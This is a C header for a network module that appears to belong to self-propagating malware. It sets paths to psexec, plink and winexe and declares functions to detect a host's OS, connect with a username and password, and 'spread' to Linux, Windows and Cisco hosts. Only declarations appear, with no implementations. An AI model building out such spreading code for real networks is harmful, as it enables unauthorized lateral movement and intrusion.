#ifndef net_H
#define net_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#define MAX_BUF_SIZE 1024
#define MAX_COMMAND_SIZE 256

#ifdef _WIN32
    // Define the paths to the Windows-specific binaries
    #define POPEN _popen
    #define PCLOSE _pclose
    #define PS_EXEC_PATH ".\\bin\\win64\\psexec.exe"
    #define PLINK_EXE_PATH ".\\bin\\win64\\plink.exe"
#else
    // Define the path to the Linux-specific winexe binary based on architecture
    #define POPEN popen
    #define PCLOSE pclose
    #ifdef __x86_64__
        #define WIN_EXE_PATH "./bin/linux64/winexe"
    #else
        #define WIN_EXE_PATH "./bin/linux32/winexe"
    #endif
#endif

enum os_type {
    UNKNOWN,
    WINDOWS,
    LINUX,
    CISCO
};


enum os_type get_os_type(const char *ip_address);
int establish_connection(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os);
void spread_linux(const char* host, const char* username, const char* password);

// static void spread_linux(const char* host, const char* username, const char* password, const char* command);

// static void spread_windows(const char* host, const char* username, const char* password, const char* command); 

// static void spread_cisco(const char* host, const char* username, const char* password, const char* command);


#endif /* net_H */
